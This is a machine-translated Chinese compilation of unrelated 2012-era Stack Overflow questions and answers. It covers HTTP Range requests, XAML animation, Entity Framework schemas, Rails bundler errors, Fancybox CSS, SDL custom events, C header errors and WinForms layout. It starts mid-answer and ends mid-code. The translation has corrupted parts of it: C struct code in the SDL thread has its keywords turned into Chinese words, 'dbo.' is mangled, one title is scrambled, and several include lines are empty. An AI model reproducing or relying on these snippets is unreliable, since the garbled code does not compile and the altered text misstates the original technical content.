无法使用多个线程从网站流中的随机位置读取。数据以线性流的形式下降，并且没有标准方法可以在多个线程中转到流中的不同位置。但是，多个线程*可以同时*下载不同的文件。

HTTPD 协议确实支持[`Range:`标头](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.35)，尽管我不确定有多少 Web 服务器支持该行为——例如 Apache。如果支持，服务器应使用以下标头进行响应：

```
Accept-Ranges: bytes 
```

然后客户端可以请求文件的特定偏移量/长度：

```
Range: bytes=21010-47021 
```

有了这个，您*可以*同时从不同范围下载多个线程，但我不确定这将如何加快下载速度，除非您从多个服务器请求。您很可能会遇到磁盘和网络限制。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:16:53.583

来自套接字的数据按顺序到达。您必须使用一些相当大的缓冲来避免这种情况。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:24:01.607

我认为您要问的是http标头

```
Accept-Ranges: bytes
Range: bytes=0-8999 
```

这将指示服务器只发送一些文件。然后，您将按顺序读取流。

另请参阅[如何使用范围标头组装文件？](https://stackoverflow.com/questions/5981564/how-to-assemble-the-file-using-the-range-header)

编辑：示例

这似乎有效

```
public static void main(String[] args) throws MalformedURLException, IOException {
    URLConnection conn = new URL("http://ftp.debian.org/debian/dists/stable/Contents-i386.gz")
            .openConnection();
    conn.addRequestProperty("Accept-Ranges","bytes");
    conn.addRequestProperty("Range", "bytes=8000000-16000000");
    InputStream input = conn.getInputStream();
    List<String> serverranges = conn.getHeaderFields().get("Accept-Ranges");
    boolean ispartial = serverranges != null && serverranges.get(0).equals("bytes");
    byte[] b = new byte[1024];
    int l ;
    System.out.println(ispartial);
    while((l=input.read(b, 0, b.length))>0){
        // if isPartial=true, we have server support. We received partial file.
        //do stuff with b,l
    }
} 
```

请务必注意，并非所有服务器都支持此功能，因此请检查 isPartial 变量。如果是假的。服务器不支持部分范围，并将为您提供文件的开头。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:22:04.697

您不能通过套接字随机读取。原则上，您有两种选择：

1.  读取整个数据流并将其放入缓冲区（例如字节数组）。将缓冲区公开给每个线程。

2.  独立读取每个线程中的整个数据流，让每个线程忽略不应该读取的所有内容。

# xaml - 有没有办法在 Metro 风格应用程序中为 Margin 属性设置动画

> ID：10499357
> 
> 赞同：10
> 
> 时间：2012-05-08T13:14:46.683
> 
> 标签：xaml, animation, storyboard, windows-8, windows-runtime

我正在尝试使用 Storyboard 类从代码中制作一些动画。没有 ThicknessAnimation 类。而且我还尝试使用 Blend 构建故事板，它在那里不起作用。它只是直接跳转到新值，没有流畅的动画。

更新：我尝试使用 TranslateX 转换。但是当我在图像上使用它时，图像会被剪裁。我正在尝试做的是在一个小网格内非常缓慢地为大图像设置动画，因此它具有这种效果（类似于 Zune 和 Windows Phone Gallery 中的效果）。一旦图像打开我开始动画，这是我的代码：

```
private void Image_ImageOpened_1(object sender, RoutedEventArgs e)
    {
        var img = sender as Image;

        Storyboard sb = new Storyboard();
        var doubleAnimationx = new DoubleAnimation() { To = -100, SpeedRatio = 0.1, From = 0 };
        Storyboard.SetTarget(doubleAnimationx, img);
        Storyboard.SetTargetProperty(doubleAnimationx, "(UIElement.RenderTransform).(CompositeTransform.TranslateX)");
        sb.Children.Add(doubleAnimationx);
        sb.Begin();
    } 
```

xml:

```
<Grid  IsSwipeEnabled="True" ItemsSource="{Binding Source={StaticResource cvs1}}" ItemClick="ItemsGridView_ItemClick_1"
                            x:Name="ItemsGridView" Margin="50,20,116,46" SelectionMode="None" IsItemClickEnabled="True"
                            AutomationProperties.AutomationId="ItemsGridView" 
                            AutomationProperties.Name="Grouped Items">
                <Grid.ItemTemplate>
                    <DataTemplate>
                        <Grid Height="250" VariableSizedWrapGrid.ColumnSpan="{Binding ColumnSpan}" Margin="2">
                            <Image ImageOpened="Image_ImageOpened_1" Stretch="UniformToFill" Source="{Binding ImageHQ}" >
                                <Image.RenderTransform>
                                    <CompositeTransform />
                                </Image.RenderTransform>
                            </Image>
                            <StackPanel VerticalAlignment="Bottom" Background="#AA000000">
                                <TextBlock Margin="5,5,5,0" FontSize="26" Text="{Binding Name,Mode=OneWay}" FontFamily="Arial Black" />
                                <TextBlock Margin="5,0,5,5" FontSize="24" Text="{Binding Section,Mode=OneWay}" Foreground="{Binding SectionColor,Mode=OneWay}" />
                            </StackPanel>
                        </Grid>
                    </DataTemplate>
                </Grid.ItemTemplate>
</Grid> 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-05-08T16:16:14.527

首先，动画边缘不是一个好主意（它需要更新整个树）。你想达到什么样的效果？是否要移动对象？如果是，请使用 DoubleAnimation 更改 TranslateTransform。

我在 Windows 8 中没有这样做，但我敢打赌几乎和 WPF 中的一样。最好在 XAML 中定义动画

```
<Window.Resources>

    <Storyboard  x:Key="mainInAnimation">
        <DoubleAnimation Storyboard.TargetName="panelTrans" 
                                Storyboard.TargetProperty="X"
                                BeginTime="0:0:0.2"
                                Duration="0:0:0.3" To="0" >
            <DoubleAnimation.EasingFunction>
                <ExponentialEase  EasingMode="EaseOut"  />
            </DoubleAnimation.EasingFunction>
        </DoubleAnimation>
    </Storyboard> 
```

然后你需要对面板进行渲染转换

```
 <StackPanel Name="leftPanel"  ... >
        <StackPanel.RenderTransform>
            <TranslateTransform x:Name="panelTrans" X="-10"></TranslateTransform>
        </StackPanel.RenderTransform> 
```

在代码中启动动画（我更喜欢这种方式）

```
 Storyboard anim = (Storyboard)this.Resources["mainInAnimation"];
        anim.Begin(); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-18T12:39:06.917

我今天遇到了完全相同的问题。为了解决它，我做了以下事情：

我的故事板首先将边距重置为我想要的值，然后通过将 TranslateTransform 设置为相反的值来抵消它。这有没有效果的效果，但现在我可以在 TranslateTransform 中实现我的动画并且图像显示。

```
<Storyboard x:Name="rotateViews">
    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(FrameworkElement.Margin)" Storyboard.TargetName="root">
        <DiscreteObjectKeyFrame KeyTime="0">
            <DiscreteObjectKeyFrame.Value>
                <Thickness>0,-100,0,0</Thickness>
            </DiscreteObjectKeyFrame.Value>
        </DiscreteObjectKeyFrame>
    </ObjectAnimationUsingKeyFrames>
    <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.RenderTransform).(CompositeTransform.TranslateY)" Storyboard.TargetName="root">
        <EasingDoubleKeyFrame KeyTime="0" Value="100"/>
        <EasingDoubleKeyFrame KeyTime="0:0:0.7" Value="0">
            <EasingDoubleKeyFrame.EasingFunction>
                <CubicEase EasingMode="EaseInOut"/>
            </EasingDoubleKeyFrame.EasingFunction>
        </EasingDoubleKeyFrame>
    </DoubleAnimationUsingKeyFrames>
</Storyboard> 
```

# c# - entity - 从实体代码中的表名中删除“.dbo”

> ID：10499358
> 
> 赞同：0
> 
> 时间：2012-05-08T13:14:50.553
> 
> 标签：c#, entity-framework

我在项目中首先使用实体​​代码，并且我想让我的表具有与模型不同的名称。

我尝试`Table`在模型类中使用 DataAnnotation：

```
[Table("tbBudget")]
public class Budget : IValidatableObject
{
... 
```

但创建的表名为`dbo.tbBudget`. 问题很简单：如何`dbo.`从实体中的表名中删除？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T13:18:07.273

德博*。*不是实际表名的一部分，而是表示模式名称。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:27:18.300

数据库中的表始终属于模式。您不能删除架构，但您可以使用流畅的配置更改它，覆盖 DbContext 中的方法

```
 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        base.OnModelCreating(modelBuilder);

        modelBuilder.Entity<Budget>().ToTable("test", "mySchema");
    } 
```

或者，如在您的示例中，您可以使用[TableAttribute](http://msdn.microsoft.com/en-us/library/system.data.linq.mapping.tableattribute.aspx)

# ruby-on-rails - 没有要加载的文件——Rails 3.2 中的捆绑器/设置与乘客

> ID：10499364
> 
> 赞同：2
> 
> 时间：2012-05-08T13:15:10.410
> 
> 标签：ruby-on-rails, ruby, rvm, passenger, bundler

我正在与乘客一起在 apache2 上运行虚拟服务器。将 RVM 用于红宝石。Ruby 版本 -> 1.9.3p194 Rails 版本 -> 3.2.3 由 Apache 虚拟主机配置设置 ...

现在，当我在浏览器中输入 url 时，会出现一个乘客错误页面：

```
no such file to load -- bundler/setup 
```

我不知道现在该怎么办。有人能帮我吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T14:09:49.357

在您的根目录中创建一个`.htaccess`并使用它来指定 GEM_PATH。

例如：

```
SetEnv GEM_PATH /home/dinduks/.rvm/gems/ruby-1.9.3-p0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:17:16.217

看起来捆绑器 gem 不在您的路径中或未安装

# javascript - 如何获取 Google Plus 通知计数？

> ID：10499367
> 
> 赞同：2
> 
> 时间：2012-05-08T13:15:17.477
> 
> 标签：javascript, ajax, api, google-chrome-extension, google-plus

我正在开发一个 Google Chrome 扩展程序，我想在后台运行的脚本中检索当前用户的 Google+ 通知计数。是否可以？[我在https://developers.google.com/+/api/](https://developers.google.com/+/api/)研究了 Google+ API，但似乎还不支持。

无论如何，如何检索计数值？我尝试使用（允许跨域的）AJAX 请求，但通知值似乎是在运行时在 JavaScript 中生成的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T21:22:04.497

您是正确的，无法从官方 API 访问通知或当前通知计数。由于抓取页面[违反了开发人员政策](https://developers.google.com/+/policies#what-you-can-not-do)，并且会导致非常脆弱的集成，因此我建议不要尝试对其进行逆向工程。

平台问题跟踪器正在跟踪对此 API的[请求。](http://code.google.com/p/google-plus-platform/issues/detail?id=96)如果您为问题加注星标，您会在问题更新时收到通知。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-01T08:51:04.473

无法从 google + api 获取通知。

# iphone - iPhone 音频队列，硬件解码

> ID：10499368
> 
> 赞同：0
> 
> 时间：2012-05-08T13:15:19.067
> 
> 标签：iphone

我正在编写一个 iPhone 应用程序，它从互联网下载音频文件并可以在下载时播放它们（如果网络缓冲区为空，则播放白噪声），所以，我认为，我不能只使用 AVAudioPlayer，应该自己填充音频缓冲区. 文件在 MP3 中，它们应该是硬件解码的。我的第一次尝试是 AudioUnit：

```
AudioStreamBasicDescription audioFormat;
bzero(&audioFormat, sizeof(AudioStreamBasicDescription));
audioFormat.mSampleRate = 44100;
audioFormat.mChannelsPerFrame = 2;
audioFormat.mFormatID = kAudioFormatMPEGLayer3;
audioFormat.mFramesPerPacket = 1152; 
```

然后用 MP3 数据包填充缓冲区，但这不起作用，因为远程 IO 不适用于压缩流，所以我决定深入研究音频队列：

```
static void HandleOutputBuffer (
    void                *aqData,
    AudioQueueRef       inAQ,
    AudioQueueBufferRef inBuffer
) {
    AQPlayerState *pAqData = (AQPlayerState *) aqData;        // 1
    if (pAqData->mIsRunning == 0) return;                     // 2
    UInt32 numBytesReadFromFile;                              // 3
    UInt32 numPackets = pAqData->mNumPacketsToRead;           // 4
    AudioFileReadPackets (
        pAqData->mAudioFile,
        false,
        &numBytesReadFromFile,
        pAqData->mPacketDescs,
        pAqData->mCurrentPacket,
        &numPackets,
        inBuffer->mAudioData
    );
    if (numPackets > 0) {                                     // 5
        inBuffer->mAudioDataByteSize = numBytesReadFromFile;  // 6
        AudioQueueEnqueueBuffer (
            pAqData->mQueue,
            inBuffer,
            (pAqData->mPacketDescs ? numPackets : 0),
            pAqData->mPacketDescs
        );
        pAqData->mCurrentPacket += numPackets;                // 7
    } else {
        AudioQueueStop (
            pAqData->mQueue,
            false
        );
        pAqData->mIsRunning = false;
    }
} 
```

问题是：会`pAqData->mAudioFile`以这种方式进行硬件解码吗？另一个问题是：如何将存储在 NSData 中的 mp3 数据提供给 AudioQueueEnqueueBuffer？

# jquery - fancybox 将标题放在顶部并留在那里

> ID：10499373
> 
> 赞同：1
> 
> 时间：2012-05-08T13:15:36.483
> 
> 标签：jquery, fancybox

我正在使用 Fancybox 2.0，我希望标题框出现在图像上方或图像顶部，而不是下方。

最重要的是内容。

我尝试制作`fancybox-inner`样式，但随后不会将`position:absolute`高度设置为绝对像素。`fancybox-wrap`

有人可以帮我实现吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-24T21:35:11.477

最好和最简单的 - 使用助手：

```
helpers : {
            title : {
                type: 'inside',
                position : 'top'
            }
        } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-08T13:28:35.300

为这些元素添加以下fancybox CSS...

```
.fancybox-title{position: absolute;top: 0;} 

.fancybox-skin{position: relative;} 
```

那应该把标题放在顶部。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-10-16T17:55:22.053

jsfiddle 上的这段代码：http: [//jsfiddle.net/JYzqR/](http://jsfiddle.net/JYzqR/)。

```
$(".fancybox").fancybox({
  helpers : {
    title: {
      type: 'inside',          
      position: 'top'
    }
  },
  nextEffect: 'fade',
  prevEffect: 'fade'
});
```

```
.fancybox-title {
  padding: 0 0 10px 0;
}
```

```
<a rel="gallery" title="Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin imperdiet augue et magna interdum hendrerit" class="fancybox" href="http://i.stack.imgur.com/oZFno.jpg"><img src="http://i.stack.imgur.com/eZSbk.jpg" alt=""/></a>
<a rel="gallery" title="Proin imperdiet augue et magna interdum hendrerit" class="fancybox" href="http://i.stack.imgur.com/tv3kk.jpg"><img src="http://i.stack.imgur.com/IWWbG.jpg" alt=""/></a>

<!-- External Resources -->
<!-- jQuery --><script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<!-- fancybox --><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.js"></script>
```

阅读“在顶部设置标题” [http://fancyapps.com/fancybox/#examples](http://fancyapps.com/fancybox/#examples)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-10T02:02:58.983

从默认的 Fancybox 2.0.6 CSS 中，替换以下内容：

```
.fancybox-title {
    position: absolute;
    top: -36px;
    left: 0;
    visibility: hidden;
    font: normal 13px/20px "Helvetica Neue",Helvetica,Arial,sans-serif;
    position: relative;
    text-shadow: none;
    z-index: 8050;
    }

.fancybox-title-float-wrap {
    position: absolute;
    z-index: 8030;
    } 
```

这会将标题定位在左上方，在我看来它看起来最好。这是一个屏幕截图：

![在此处输入图像描述](../Images/d39dfdcbbae86af603a8b8cc44be5701.png)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T13:52:48.930

要将标题放在顶部，通过使用 Jquery，您可以使用 Fancybox 回调操作相关的 CSS，当加载内容时，使用`beforeLoad`or `afterLoad`，当 Fancybox 更新时，使用`onUpdate`.

因此，您可以使用一些回调来最适合您的需求：[Link to FancyBox Docs](http://fancyapps.com/fancybox/#docs)

* * *

假设您正在使用下面的代码加载您的幻想框，并且要操纵标题位置，您可以调用“ *onUpdate* ”和“ *afterLoad* ”来触发该更改：

**查询示例**

```
$(document).ready(function() {
  $("#my_popup_id").fancybox({
    "onUpdate"  : function() {
      $(".fancybox-title").css({'top':'0px', 'bottom':'auto'});
    },
    "afterLoad" : function() {
      $(".fancybox-title").css({'top':'0px', 'bottom':'auto'});
    }
  });
}); 
```

* * *

现在，上面的例子把[Fancybox](http://fancyapps.com/fancybox/)的标题放在了顶部，但是如果你需要它在外面，远离框架，你需要给“top”设置一个负值，但是考虑到框架不能占据整个屏幕，因此这个新示例中的宽度和高度参数：

**jQuery 示例 2**

```
$(document).ready(function() {
  $("#my_popup_id").fancybox({
    "autoSize"  : false,
    "width"     : '70%',
    "height"    : '70%',
    "onUpdate"  : function() {
      $(".fancybox-title").css({'top':'-30px', 'bottom':'auto'});
    },
    "afterLoad" : function() {
      $(".fancybox-title").css({'top':'-30px', 'bottom':'auto'});
    }
  });
}); 
```

检查提供的文档链接，特别是“回调”选项卡。

* * *

**编辑：**

在这里，[小提琴链接！](http://jsfiddle.net/zuul/KHyWF/)

**新的编辑说明：**

[neokio](https://stackoverflow.com/a/10526600/352449)指出了一个只需对[Fancybox 样式表](http://fancyapps.com/fancybox/source/jquery.fancybox.css?v=2.0.6)进行简单调整的解决方案，因此，确实对于简单的标题位置控制来说，这是[最好的方法](https://stackoverflow.com/a/10526600/352449)。

这个答案中的一个对于一些更复杂的 CSS 操作很有用。

* * *

**已编辑：**还有[neokio](http://jsfiddle.net/zuul/KHyWF/2/)提出的解决方案的小提琴！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-23T18:13:07.193

Neokio 走在正确的轨道上，但我认为这对原始代码的破坏性较小，只需向样式表添加新的类样式然后引用它即可。

```
// Put at bottom of jquery.fancybox.css, change as needed
.fancybox-title-top-wrap {
  position: absolute;
  top: -30px;
  left: 0;
  background: transparent; /* Fallback for web browsers that doesn't support RGBa */
  background: rgba(0, 0, 0, 0.7);
  border-radius: 5px;
  text-shadow: 0 1px 2px #222;
  color: #FFF;
  padding: 2px 20px;
  font-size: 16px;
} 
```

然后只需使用：

```
helpers: { title: 'top' } 
```

您不会丢失任何原始样式，并且可以根据需要继续添加样式。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-02T11:30:15.063

Chris Mackie 的回答是最干净的。没有其他`afterUpload`问题。您可以添加以将 FancyBox 的顶部向下推的唯一内容是边距：

```
$(document).ready(function() {

      $('.fancybox').fancybox({
                    padding      : 0,
          margin       : [60, 60, 20, 60],
          autoSize     : false, 
          autoCenter   : true,
          fitToView    : true,
          openEffect   : 'fade',
          closeEffect  : 'fade',
          openSpeed    : 100,
          closeSpeed   : 100,
          width        : 900,
          height       : 600
     });

}); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-08-03T12:23:37.693

通过在包含 fancybox.css*后*添加以下代码段来覆盖 fancybox 的默认 css

```
// set modal title above container (overriding default bottom)
.fancybox-title-float-wrap {
  bottom: auto;
  top: -35px;
} 
```

或者，如果您使用带有 LESS 的构建系统（在此处使用 GruntJS），那么它就像在您的 fancybox-custom.less 中一样简单。

```
@import "fancybox"; 
```

连同上面的片段；这样你就可以将你的补丁整合在一个地方而不是分散在你的应用程序周围。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-03-26T05:45:06.000

```
afterLoad   : function() {
    this.outer.prepend( '<a href="index.html"> <img src="img/logo.svg" class="logoShow"></a>' );

    } 
```

尝试将该代码放入您的 fancybox 函数中。例如

```
$("a[href$='.jpg'],a[href$='.png'],a[href$='.gif']").attr('rel', 'gallery').fancybox({
openEffect  : 'none',
closeEffect : 'none',
afterLoad   : function() {
    this.outer.prepend( '<a href="index.html"> <img src="img/logo.svg" class="logoShow"></a>' );
    } 
```

});

并设置类`"logoShow"`css

# rest - 使用 Twitter API 上传图片 - java

> ID：10499382
> 
> 赞同：2
> 
> 时间：2012-05-08T13:15:56.150
> 
> 标签：rest, jakarta-ee, twitter

我想使用 twitter API 上传新的个人资料图片，在文档中提到 **此方法需要原始多部分数据，而不是图像的 URL。** 如何创建此类数据并将其传递给 API？

问候， 阿布舍克·兰詹

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-09T05:00:17.720

您必须使用 cURL 发出 POST 请求。或相当于 cURL 的 Java。

# c++ - 创建自己的 SDL Event 结构是否安全？

> ID：10499385
> 
> 赞同：0
> 
> 时间：2012-05-08T13:16:02.607
> 
> 标签：c++, sdl

我想使用 SDL 用户事件来跟踪我的应用程序中的自定义事件。我的问题是 SDL_UserEvent 结构只提供了一个 int 和两个 v​​oid 指针。

```
类型定义结构{
  uint8 类型；
  整数代码；
  无效*数据1；
  无效*数据2；
} SDL_用户事件；

```

我希望有一个具有以下结构的事件：

```
类型定义结构{
  uint8 类型；/* 设置为 SDL_USEREVENT + MAP */
  整数代码；/* 设置为 MAP_COLLISION */
  Uint8 tile_x;
  Uint8 tile_y;
  Uint8 瓦片类型；
} UserEvent_MapCollision;

```

然后，只要我想处理 MAP 事件，我就可以重新解释该结构，如果我不这样做，则无需额外处理即可丢弃该消息。使用这种技术可以简化我的事件处理程序（无需 malloc 和释放此结构并将其附加到事件）。

只要我检查（在构建时？）`sizeof(UserEvent_MapCollision) <= sizeof(SDL_Event)`，并且 SDL 事件队列不会以任何方式修改推送的事件，这会起作用吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:31:43.243

是的，它会起作用，记住`SDL_Event`结构本身是一个很大的`union`. 你是对的，如果你不确定你的结构是否适合`SDL_Event`你可以添加这个编译时断言：`sizeof(UserEvent_MapCollision) <= sizeof(SDL_Event)`。

```
/* Push event */
SDL_Event e;
UserEvent_MapCollision* p = static_cast<UserEvent_MapCollision*>(&e);;

e.type = SDL_USEREVENT + MAP;
e.code = MAP_COLLISION;
p.tile_x = 10;
p.tile_y = 20;
p.tile_type = 7;

/* Receive event */
SDL_Event e;
while (SDL_PollEvents(&e)) {
    if (e.type == SDL_USEREVENT + MAP) {
        if (e.user.code == MAP_COLLISION) {
            UserEvent_MapCollision *p = static_cast<UserEvent_MapCollision>(&e)
            HandleMapCollision(p);
        }
    }
} 
```

要在编译时检查断言，您可以使用 SDL 宏`SDL_COMPILE_TIME_ASSERT`，它定义在`SDL_stdinc.h`：

```
SDL_COMPILE_TIME_ASSERT(UserEvent_MapCollision, sizeof(UserEvent_MapCollision) <= sizeof(SDL_Event)); 
```

作为旁注，这两个`void*`指针旨在引用另一个结构。

```
typedef struct {
  Uint8 tile_x;
  Uint8 tile_y;
  Uint8 tile_type;
} MyCustomEventStruct;

/* Create event */

SDL_UserEvent e;
MyCustomEventStruct *p;

p = new MyCustomEventStruct;
p->tile_x = 10;
p->tile_y = 20;
p->tile_type = 7;

e.type = SDL_USEREVENT + MAP;
e.code = MAP_COLLISION;
e.data1 = p;
e.data2 = 0;

SDL_PushEvent(&e);

/* Receive Event */

while (SDL_PollEvents(&e)) {
    if (e.type == SDL_USEREVENT + MAP) {
        if (e.user.code == MAP_COLLISION) {
            MyCustomEventStruct* p = static_cast<MyCustomEventStruct*>(e.user.data1);
            HandleMapCollision(p);
            delete p;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:31:33.820

虽然这可能有效，但我认为你最好在函数或宏中做这样的事情：

```
Uint8 tile_x = static_cast<Uint8>(reinterpret_cast<uintptr_t>(sdl_event->data1) & 0xFF);
Uint8 tile_y = static_cast<Uint8>((reinterpret_cast<uintptr_t>(sdl_event->data1) >> 8) & 0xFF);
Uint8 tile_type = static_cast<Uint8>((reinterpret_cast<uintptr_t>(sdl_event->data1) >> 16) & 0xFF); 
```

还有这个：

```
sdl_event->data1 = reinterpret_cast<void *>(
    static_cast<uintptr_t>(tile_x) |
    static_cast<uintptr_t>(tile_y) << 8 |
    static_cast<uintptr_t>(tile_type) << 16 ); 
```

# qt - GPRS实时双向推送通信？

> ID：10499388
> 
> 赞同：1
> 
> 时间：2012-05-08T13:16:10.787
> 
> 标签：qt, gps, comet, server-push, gprs

以下是描述[沃尔沃客车 IT 系统](http://www.volvobuses.com/bus/global/en-gb/partservice/its4mobility/Pages/vehicle%20and%20transport%20management.aspx)的文档中的一个用例：

*在驾驶公共汽车时，司机会根据时间表不断获得有关路线、下一站以及有关他的工作情况的实时信息。*

> 车辆与时间表的偏差，实时显示，以真实数字和易于理解的图形“仪表”形式显示。信息不断更新。

所有这些信息都通过 GPRS 从中央系统发送到车载计算机。

我对能够实现这种基于事件的通信的技术感兴趣。本质上，驱动程序以实时模式而不是计划更新模式从调度程序获取实时时间表信息或任意消息。据我了解，这意味着车载计算机的软件以某种方式“订阅”了源自中央系统（服务器）的事件。

我知道要在服务器和 Web 浏览器之间启用这种基于事件的实时通信，可以使用[Comet技术。](http://en.wikipedia.org/wiki/Comet_%28programming%29)

但是，如何使用某种 Qt/Embedded Qt 客户端软件而不是通常的 Web 浏览器在服务器和机载计算机之间使用相同的功能呢？

对于非基于 Web 浏览器的应用程序是否有任何类似 Comet 的技术标准？

*额外的小问题：*在这种情况下，GPRS 连接是否会引入任何问题？（例如，当通过 GPRS/3G 连接时，我的 Android 智能手机可能会丢失一些 XMPP 聊天消息，其中一些永远不会发送）。

# c - 错误：在 'int' 之前应为 '='、','、';'、'asm' 或 '__attribute__'

> ID：10499389
> 
> 赞同：3
> 
> 时间：2012-05-08T13:16:12.173
> 
> 标签：c, header-files

在 LINUX 中编译 C 程序时，我明白了。错误：

```
stream.h:1123: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'int'
stream.h:1124: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'mblk_t'
stream.h:1125: error: expected '=', ',', ';', 'asm' or '__attribute__' before 'mblk_t' 
```

第 1123,1124 和 1125 行如下：

```
__STREAMS_EXTERN int adjmsg(mblk_t *mp, register ssize_t length);
__STREAMS_EXTERN mblk_t *allocb(size_t size, unsigned int priority);
__STREAMS_EXTERN mblk_t *copyb(register mblk_t *mp); 
```

C 程序包含一个头文件，该文件又包含 stream.h 知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:17:54.837

很清楚，`__STREAMS_EXTERN`它的定义方式是把事情搞砸了。

如何`__STREAMS_EXTERN`定义？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:57:27.447

您的代码上下文并不清楚，但在我看来，您正在使用 OpenSSL 库（或者您正在从该源代码进行复制和粘贴）。

`streams_fastcall`宏在头文件中定义`kmem.h`。你包括了吗？如果您只是在进行复制和粘贴，您只需在`STREAMS_EXTERN`定义之前添加以下行：

```
#ifndef streams_fastcall
#if defined __i386__ || defined __x86_64__ || defined __k8__
#define streams_fastcall __attribute__((__regparm__(3)))
#else
#define streams_fastcall
#endif
#endif 
```

**注意**：`streams_fastcall` *听起来*像 Microsoft 特定（但在 Windows 上广泛使用）调用约定名为`__fastcall`. 我猜他们使用了这个名字，因为它使用`regparm`属性来指定一些参数应该使用寄存器而不是堆栈来传递，这就是`__fastcall`定义（或者仅仅是因为它更快！哈哈）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-01T12:36:03.360

如果错误与任何缺失无关；或代码中的类似语法错误，请检查对 openSSL 包含的错误引用。

使用您的 openSSL 在 /opt/openssl/include/openssl 中包含 err.h 和 evp.h，并且您编译的指令为 -I。-L /opt/openssl/lib、-l 加密和 -l dl

将此包含在您的 .h 文件中会引发错误：#include（与 err.h 相同）。

只需用这个包含替换它：#include 来解决它。

# c# - 时间：2019-05-10 标签：c#win forms make controls resizable

> ID：10499391
> 
> 赞同：5
> 
> 时间：2012-05-08T13:16:14.113
> 
> 标签：c#, winforms, user-interface

我有一个面板，里面有两个控件。我希望它们被粘在面板的边框上（面板有一些无法更改的宽度和高度），但有可能调整它们（控件）在垂直方向上从面板获得的空间量。

```
panel.Controls.Add(listview1);
panel.Controls.Add(listview2); 
```

两个列表视图一个接一个（垂直）放置。我希望有可能“改变它们的高度”（通过选择它们之间的边界来调整大小）。

我希望你明白我的意思。提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T13:21:03.153

我建议使用设计器工具箱的 Containers 部分中的[SplitContainer 控件](http://msdn.microsoft.com/en-us/library/system.windows.forms.splitcontainer.aspx)。

这是[有关使用 SplitContainer 的 MSDN 培训视频。](http://msdn.microsoft.com/en-us/vstudio/Video/bb798031)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:18:41.613

您需要使用[表格布局面板](http://msdn.microsoft.com/it-it/library/system.windows.forms.tablelayoutpanel%28v=vs.100%29.aspx)来实现

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-08T13:24:00.230

将上部的 doc 属性设置为顶部。在同一容器（面板）中添加一个方向为垂直的分隔条。将下一个的 Dock 属性设置为填充。无论如何，这是一种方法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-08T13:25:47.890

我同意 Paul 的观点，[SplitContainer](http://msdn.microsoft.com/en-us/library/system.windows.forms.splitcontainer.aspx)就是您正在寻找的东西。我要补充一点，您需要设置放在拆分容器内的控件的 Dock 和 Anchor 属性。如果您将子控件的`Dock`属性设置为`Fill`，它将扩展以填满整个容器，而不管面板的大小如何。`Anchor`如果面板中有多个控件，则使用该属性。在这种情况下，您设置子控件的`Anchor`属性来告诉子控件哪些边“粘”到容器的边上。请参阅[此页面](http://www.techrepublic.com/article/manage-winform-controls-using-the-anchor-and-dock-properties/6165908)以更全面地了解这两个属性。

此外，您还需要在控件本身上设置`Dock`或`Anchor`属性。`SplitContainer`这将使它在表单调整大小时调整大小。然后在里面设置子控件的`Anchor`/`Dock`属性`SplitContainer`会导致子控件随着容器大小的调整而调整大小。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-08T13:22:35.227

您是否考虑过在 ListViews 上使用 Anchor？

```
 this.panel1 = new System.Windows.Forms.Panel();
        this.listView1 = new System.Windows.Forms.ListView();
        this.listView2 = new System.Windows.Forms.ListView();
        this.panel1.SuspendLayout();
        this.SuspendLayout();
        // 
        // panel1
        // 
        this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
        | System.Windows.Forms.AnchorStyles.Left) 
        | System.Windows.Forms.AnchorStyles.Right)));
        this.panel1.Controls.Add(this.listView2);
        this.panel1.Controls.Add(this.listView1);
        this.panel1.Location = new System.Drawing.Point(12, 12);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(413, 280);
        this.panel1.TabIndex = 0;
        // 
        // listView1
        // 
